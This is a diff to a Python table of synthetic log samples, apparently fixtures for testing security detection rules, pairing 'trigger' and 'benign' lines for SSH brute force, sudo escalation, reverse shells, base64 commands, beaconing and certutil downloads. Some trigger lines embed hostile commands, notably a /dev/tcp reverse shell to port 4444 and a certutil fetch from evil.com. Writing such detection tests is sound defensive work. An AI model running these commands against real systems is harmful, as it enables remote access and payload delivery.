@@ -11,7 +11,7 @@ log_definitions = {
                    "Dec 10 14:23:05 webserver01 sshd[12460]: Failed password for root from 192.168.1.105 port 54823 ssh2\n"
                    "Dec 10 14:23:07 webserver01 sshd[12461]: Failed password for root from 192.168.1.105 port 54824 ssh2\n"
                    "Dec 10 14:23:09 webserver01 sshd[12462]: Failed password for root from 192.168.1.105 port 54825 ssh2\n",
-        "benign": "Dec 10 14:23:01 webserver01 sshd[12458]: Failed password for root from 192.168.1.105 port 54821 ssh2\n"
+        "benign": "Dec 10 14:23:01 webserver01 sshd[12458]: Accepted password for jsmith from 192.168.1.105 port 54821 ssh2\n"
     },
     "pr-aa-05/sudo-privilege-escalation": {
         "trigger": "Dec 10 14:24:00 webserver01 sudo:   subhash : TTY=pts/0 ; PWD=/home/subhash ; USER=root ; COMMAND=/bin/bash\n",
@@ -178,8 +178,8 @@ log_definitions = {
         "benign": 'type=SYSCALL msg=audit(1779953406.123:466): path=/etc/shadow uid=0 exe="/usr/bin/passwd"\n'
     },
     "de-ae-02/reverse-shell": {
-        "trigger": 'type=SYSCALL msg=audit(1779953407.123:467): exe="bash -i"\n',
-        "benign": 'type=SYSCALL msg=audit(1779953407.123:467): exe="/bin/bash"\n'
+        "trigger": 'type=SYSCALL msg=audit(1779953407.123:467): arch=c000003e syscall=59 success=yes exe="/bin/bash" a0="bash" a1="-c" a2="exec /dev/tcp/192.168.1.105/4444 0>&1" key="exec"\n',
+        "benign": 'type=SYSCALL msg=audit(1779953407.123:467): arch=c000003e syscall=59 success=yes exe="/bin/bash" a0="bash" a1="script.sh" key="exec"\n'
     },
     "de-ae-02/base64-cmd": {
         "trigger": 'type=SYSCALL msg=audit(1779953408.123:468): exe="base64 -d dGhpcyBpcyBhIHZlcnkgbG9uZyBzdHJpbmcgZm9yIGJhc2U2NA=="\n',
@@ -195,7 +195,7 @@ log_definitions = {
     },
     "de-ae-02/beaconing": {
         "trigger": '{"win":{"system":{"eventID":"3","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"1.2.3.4"}}}\n'*20,
-        "benign": '{"win":{"system":{"eventID":"3","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"8.8.8.8"}}}\n'
+        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"notepad.exe","destinationIsIpv6":"false"}}}\n'
     },
     "de-ae-02/certutil": {
         "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"certutil.exe -urlcache -split -f http://evil.com/payload"}}}\n',
